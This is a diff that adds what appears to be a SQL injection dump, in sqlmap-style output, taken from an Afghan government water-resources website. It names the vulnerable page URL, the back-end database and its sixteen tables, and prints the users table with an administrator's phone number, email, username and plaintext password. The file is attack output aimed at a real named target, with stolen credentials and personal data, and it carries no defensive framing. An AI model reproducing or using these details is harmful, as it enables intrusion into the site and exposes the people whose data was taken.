@@ -1,0 +1,49 @@
+.gov Government
+
+.af Afghanistan
+
+İslamic Republic Of Afghanistan
+
+National Water Affairs Regulation Authority
+
+Technical Deputy
+
+General Directorate Of Water Resource (GDWR)
+
+https://wrd-mew.gov.af/news_item.php?id=2
+
+the back-end DBMS: MySQL >= 5.0.12
+
+available databases [2]:
+[+] information_schema
+[+] wrdmewgo_wrd
+
+Database: wrdmewgo_wrd
+[16 tables]
++---------------------+
+| about               |
+| address             |
+| advertises          |
+| attachements        |
+| gallery             |
+| hydrology           |
+| jobs                |
+| meteorology         |
+| news                |
+| provinces           |
+| regions             |
+| services_activities |
+| sliders             |
+| sub_basins          |
+| tbl_data            |
+| users               |
++---------------------+
+
+Database: wrdmewgo_wrd
+Table: users
+[1 entry]
++------------+--------+----------------------------------+-----------+-----------------+-----------------+
+| phone      | name   | password                         | last_name | user_name       | email           |
++------------+--------+----------------------------------+-----------+-----------------+-----------------+
+| 0797243004 | admin  | Admin2018                        | admin     | admin@gmail.com | admin@gmail.com |
++------------+--------+----------------------------------+-----------+-----------------+-----------------+
